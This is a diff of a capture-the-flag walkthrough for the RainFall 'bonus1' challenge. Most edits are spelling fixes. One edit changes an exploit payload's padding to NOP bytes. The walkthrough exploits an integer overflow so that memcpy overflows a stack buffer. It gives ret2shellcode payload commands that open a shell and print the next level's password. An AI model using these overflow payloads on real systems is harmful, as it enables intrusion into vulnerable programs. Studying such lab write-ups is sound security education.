@@ -87,17 +87,17 @@ memcpy(0xbffff704, "TEST", 44) = 0xbffff704
 As we can see, `atoi` returns `0x8000000b` which is 11 in decimal (if we ignore the 8). Furthermore, `memcpy` copies 44 bytes to the buffer, which means we can write over `ret`.
 > We can also provide more bytes than is allocated for the stack, which would allow us to write over the return address. We'll see this in the ret2libc section.
 
-There's different ways to solve this challenge, we'll see two of them. First the intended way with writing over the int then the ret2libc way and finally the ret2shellcode way.
+There are different ways to solve this challenge, we'll see two of them. First the intended way with writing over the int then the ret2libc way and finally the ret2shellcode way.
 
 ### Write over the int
-As mentionned above, we can write over the `ret` variable with the following:
+As mentioned above, we can write over the `ret` variable with the following:
 ```bash
 number + padding + value of ret
 
 -2147483637 + "\x90" * 40 + 0x574f4c46
 ```
 
-Indeed since `-2147483638` allows us to write 44 bytes to the buffer, we can write 40 bytes of padding and then the value of `ret` so that the `if` condition is satisfied.
+Indeed, since `-2147483638` allows us to write 44 bytes to the buffer, we can write 40 bytes of padding and then the value of `ret` so that the `if` condition is satisfied.
 
 Let's try it:
 ```bash
@@ -156,7 +156,7 @@ By calculating the difference between `esp` and `ebp` we can see that the stack 
 0xbffff728 - 0xbffff6e0 = 48 (72 in decimal)
 ```	
 
-Furthermore, we can see that our buffer is located at `0x14(%esp),%eax`. Since there is 72 bytes for the stack, our buffer will therefore requiere 52 bytes (72 - 20) before reaching `ebp`.
+Furthermore, we can see that our buffer is located at `0x14(%esp),%eax`. Since there is 72 bytes for the stack, our buffer will therefore require 52 bytes (72 - 20) before reaching `ebp`.
 
 Since our goal is to overflow the stack until we reach the return address of the main function, we need to add another 4 bytes to go from `ebp` to `ebp + 4` (the return address). So a total of 56 bytes (52 + 4).
 
@@ -187,7 +187,7 @@ Perfect, let's move to the other solution.
 ### Ret2shellcode
 Check the [level1's walkthrough](../level1/walkthrough.md#ret2shellcode) for an explanation of the ret2shellcode technique.
 
-Since we already have our padding, we need a number that will allow us to write 56 bytes to reach the return address and then the addresse our shellcode. So a total of 60 bytes (56 + 4):
+Since we already have our padding, we need a number that will allow us to write 56 bytes to reach the return address and then the address our shellcode. So a total of 60 bytes (56 + 4):
 ```bash
 ❯ ./a.out -2147483633
 -8589934532 vs 60
@@ -219,12 +219,12 @@ Alright, let's craft our payload:
 ```
 number + padding + address of shellcode in the env
 
--2147483633 + 56 * A  + "\xbf\xff\xf8\x48"
+-2147483633 + "\x90" * 56  + "\xbf\xff\xf8\x48"
 ```
 
 Let's run it:
 ```bash
-bonus1@RainFall:~$ ./bonus1 -2147483633 `python -c 'print("A"*56 + "\xbf\xff\xf8\x48"[::-1])'`
+bonus1@RainFall:~$ ./bonus1 -2147483633 `python -c 'print("\x90"*56 + "\xbf\xff\xf8\x48"[::-1])'`
 $ cat /home/user/bonus2/.pass
 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
 ```
